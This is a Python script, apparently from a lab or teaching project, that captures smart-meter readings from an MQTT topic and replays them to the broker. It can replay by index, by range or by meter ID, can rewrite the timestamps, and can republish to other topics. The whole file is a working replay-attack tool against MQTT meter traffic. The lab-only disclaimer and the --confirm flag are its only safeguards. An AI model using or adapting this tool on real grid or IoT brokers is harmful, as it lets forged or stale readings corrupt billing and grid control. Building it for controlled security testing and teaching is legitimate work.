#!/usr/bin/env python3
"""
attacker.py - capture & replay MQTT meter messages for lab/demo only.

Usage examples:
# Capture mode (default)
python attacker.py --mode capture

# Replay the first captured message after 5s (requires --confirm)
python attacker.py --mode replay --index 0 --delay 5 --confirm

# Replay all messages for a particular meterID
python attacker.py --mode replay --meter "0xAbC..." --confirm

# Replay range (index from-to)
python attacker.py --mode replay --from-index 0 --to-index 10 --confirm

# Replay and modify timestamp to "now" before publishing
python attacker.py --mode replay --index 0 --preserve-ts false --confirm

Note: This tool is intended for controlled lab testing only. Do not use
on production or third-party networks.
"""

import os
import json
import time
import argparse
import threading
from typing import List, Dict, Any

import paho.mqtt.client as mqtt

# ----------------- CONFIG -----------------
DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "grid/readings"
CAPTURE_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "data", "captures.json"))
# ------------------------------------------

os.makedirs(os.path.dirname(CAPTURE_FILE), exist_ok=True)


def load_captures() -> List[Dict[str, Any]]:
    if not os.path.exists(CAPTURE_FILE):
        return []
    with open(CAPTURE_FILE, "r") as f:
        return json.load(f)


def save_captures(captures: List[Dict[str, Any]]):
    with open(CAPTURE_FILE, "w") as f:
        json.dump(captures, f, indent=2)


def timestamp_now():
    return int(time.time())


class Attacker:
    def __init__(self, broker=DEFAULT_BROKER, port=DEFAULT_PORT, topic=DEFAULT_TOPIC):
        self.broker = broker
        self.port = port
        self.topic = topic
        self.captures = load_captures()
        self.client = mqtt.Client(client_id="attacker_capture")
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message

    def on_connect(self, client, userdata, flags, rc):
        print(f"[attacker] connected to {self.broker}:{self.port} (rc={rc}). Subscribing to {self.topic}")
        client.subscribe(self.topic)

    def on_message(self, client, userdata, msg):
        try:
            payload_text = msg.payload.decode('utf-8')
            payload = json.loads(payload_text)
        except Exception as e:
            print("[attacker] failed to parse message payload:", e)
            return

        record = {
            "captured_at": timestamp_now(),
            "topic": msg.topic,
            "payload": payload
        }
        self.captures.append(record)
        # Persist immediately to avoid data loss
        save_captures(self.captures)
        idx = len(self.captures) - 1
        print(f"[capture #{idx}] topic={msg.topic} meterID={payload.get('meterID')} seq={payload.get('seq')} ts={payload.get('ts')}")

    def start_capture(self):
        try:
            self.client.connect(self.broker, self.port, keepalive=60)
        except Exception as e:
            print("[attacker] failed to connect to broker:", e)
            return
        print("[attacker] starting capture. Ctrl-C to stop.")
        self.client.loop_forever()

    # ---------- REPLAY LOGIC ----------
    def _publish(self, payload_obj: Dict[str, Any], target_topic: str, preserve_ts: bool):
        # Optionally update ts to now (or leave original)
        p = dict(payload_obj)  # shallow copy
        if not preserve_ts:
            p['ts'] = timestamp_now()
        # publish raw JSON exactly as-is (signature field remains unchanged)
        pub = mqtt.Client(client_id=f"attacker_pub_{int(time.time()*1000)}")
        pub.connect(self.broker, self.port, 60)
        pub.loop_start()
        payload_text = json.dumps(p, separators=(",", ":"), sort_keys=False)
        pub.publish(target_topic, payload_text)
        # short sleep to ensure message pushes out, then stop loop
        time.sleep(0.2)
        pub.loop_stop()
        pub.disconnect()

    def replay_by_index(self, index: int, delay: float = 0.0, preserve_ts: bool = True, target_topic: str = None):
        if index < 0 or index >= len(self.captures):
            print("[replay] invalid index:", index)
            return
        rec = self.captures[index]
        tgt = target_topic or rec["topic"] or self.topic
        print(f"[replay] will replay index {index} -> topic {tgt} after {delay}s (preserve_ts={preserve_ts})")
        time.sleep(delay)
        self._publish(rec["payload"], tgt, preserve_ts)
        print("[replay] done.")

    def replay_by_meter(self, meter_id: str, delay: float = 0.0, preserve_ts: bool = True, target_topic: str = None, limit: int = None):
        matches = [ (i,r) for i,r in enumerate(self.captures) if r["payload"].get("meterID","").lower() == meter_id.lower() ]
        if not matches:
            print("[replay] no captures for meter:", meter_id)
            return
        if limit:
            matches = matches[:limit]
        print(f"[replay] found {len(matches)} captures for meter {meter_id}. Replaying with delay {delay}s between messages.")
        for i, rec in matches:
            tgt = target_topic or rec["topic"] or self.topic
            print(f"[replay] replaying index {i} -> {tgt}")
            self._publish(rec["payload"], tgt, preserve_ts)
            time.sleep(delay)
        print("[replay] done.")

    def replay_range(self, start: int, end: int, delay_between: float = 0.5, preserve_ts: bool = True, target_topic: str = None):
        start = max(0, start)
        end = min(len(self.captures)-1, end)
        if start > end:
            print("[replay] invalid range")
            return
        print(f"[replay] replaying [{start}..{end}] to topic {target_topic or self.topic} with {delay_between}s between msgs.")
        for i in range(start, end+1):
            rec = self.captures[i]
            tgt = target_topic or rec["topic"] or self.topic
            print(f"[replay] index {i} seq={rec['payload'].get('seq')}")
            self._publish(rec['payload'], tgt, preserve_ts)
            time.sleep(delay_between)
        print("[replay] done.")

    def replay_all(self, delay_between: float = 0.2, preserve_ts: bool = True, target_topic: str = None, limit: int = None):
        n = len(self.captures) if limit is None else min(limit, len(self.captures))
        print(f"[replay] replaying all ({n}) captures with {delay_between}s between messages.")
        for i in range(n):
            rec = self.captures[i]
            tgt = target_topic or rec["topic"] or self.topic
            self._publish(rec['payload'], tgt, preserve_ts)
            time.sleep(delay_between)
        print("[replay] done.")


# ----------------- CLI -----------------
def parse_args():
    p = argparse.ArgumentParser(description="Capture & replay MQTT meter messages (lab/demo only).")
    p.add_argument("--mode", choices=["capture", "replay"], default="capture", help="capture or replay mode")
    p.add_argument("--broker", default=DEFAULT_BROKER, help="MQTT broker host (default: localhost)")
    p.add_argument("--port", type=int, default=DEFAULT_PORT, help="MQTT broker port")
    p.add_argument("--topic", default=DEFAULT_TOPIC, help="MQTT topic to subscribe/publish")
    # replay options:
    p.add_argument("--index", type=int, help="replay the capture at this index")
    p.add_argument("--from-index", type=int, dest="from_index", help="replay starting index (inclusive)")
    p.add_argument("--to-index", type=int, dest="to_index", help="replay ending index (inclusive)")
    p.add_argument("--meter", help="replay captures for this meterID (case-insensitive)")
    p.add_argument("--delay", type=float, default=0.0, help="delay before the first replay in seconds")
    p.add_argument("--delay-between", type=float, default=0.5, help="delay between messages when replaying multiple")
    p.add_argument("--preserve-ts", choices=["true", "false"], default="true", help="preserve original ts in replay (true) or set to now (false)")
    p.add_argument("--target-topic", help="publish to a different topic than original")
    p.add_argument("--limit", type=int, help="limit number of messages when replaying by meter or all")
    # safety:
    p.add_argument("--confirm", action="store_true", help="REQUIRED to perform replay actions (safety)")
    return p.parse_args()


def main():
    args = parse_args()
    atk = Attacker(broker=args.broker, port=args.port, topic=args.topic)

    if args.mode == "capture":
        # start capturing and appending to CAPTURE_FILE
        atk.start_capture()
        return

    # REPLAY mode
    # safety checks:
    if args.broker != "localhost" and not args.confirm:
        print("Broker is not localhost. If you really want to replay to a non-local broker, re-run with --confirm")
        return
    if not args.confirm:
        print("Replay operations require --confirm to avoid accidental misuse. Add --confirm and re-run.")
        return

    # ensure captures loaded
    atk.captures = load_captures()
    if len(atk.captures) == 0:
        print("No captures available to replay. Run in capture mode first.")
        return

    preserve_ts = True if args.preserve_ts == "true" else False

    # single index replay
    if args.index is not None:
        atk.replay_by_index(index=args.index, delay=args.delay, preserve_ts=preserve_ts, target_topic=args.target_topic)
        return

    # meter-specific replay
    if args.meter:
        atk.replay_by_meter(meter_id=args.meter, delay=args.delay or args.delay_between, preserve_ts=preserve_ts, target_topic=args.target_topic, limit=args.limit)
        return

    # range replay
    if args.from_index is not None or args.to_index is not None:
        start = args.from_index if args.from_index is not None else 0
        end = args.to_index if args.to_index is not None else (len(atk.captures)-1)
        atk.replay_range(start=start, end=end, delay_between=args.delay_between, preserve_ts=preserve_ts, target_topic=args.target_topic)
        return

    # default: replay all
    atk.replay_all(delay_between=args.delay_between, preserve_ts=preserve_ts, target_topic=args.target_topic, limit=args.limit)


if __name__ == "__main__":
    main()
